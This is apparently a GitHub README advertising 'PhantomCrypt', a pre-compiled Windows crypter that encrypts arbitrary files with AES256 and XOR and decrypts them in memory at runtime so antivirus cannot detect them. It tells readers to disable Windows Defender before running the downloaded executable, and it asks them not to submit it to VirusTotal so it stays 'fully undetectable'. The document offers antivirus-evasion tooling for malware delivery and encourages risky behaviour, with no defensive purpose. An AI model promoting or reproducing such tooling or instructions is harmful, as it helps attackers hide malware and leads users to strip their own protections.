PhantomCrypt is a next-gen, fully undetectable (FUD) crypter designed to outsmart all antivirus solutions on Windows.

**Overview**
----
PhantomCrypt is engineered to be a fully undetectable crypter that seamlessly bypasses all antivirus systems. I maintain regular updates to the stub, ensuring it stays FUD. In return for my ongoing effort, please refrain from uploading the tool to VirusTotal or similar platforms. Let's work together to keep PhantomCrypt the only FUD crypter available on GitHub.

Initially crafted for personal use, PhantomCrypt has been simplified to make it accessible to a wider audience. It’s user-friendly, pre-compiled, and primarily supports Windows. I plan to release the source code for potential modifications on Linux (currently incompatible with Wine).

**Installation & Usage**
----
Important: Disable Windows Defender or any active antivirus before proceeding!

Download: [Download PhantomCrypt]
Extract: Unzip the downloaded file.
Run: Launch PhantomCrypt.exe.
Setup: Set your input (the file you want to encrypt) and output (where the FUD file will be saved).
Crypt: Click "ENCRYPT NOW" and wait a few moments for the process to complete. Your fully undetectable file will be ready!
How It Works
PhantomCrypt employs sophisticated AES256 and XOR encryption techniques to obfuscate your file’s bytes. The encrypted data is held in memory and decrypted only at runtime, ensuring it remains undetectable.
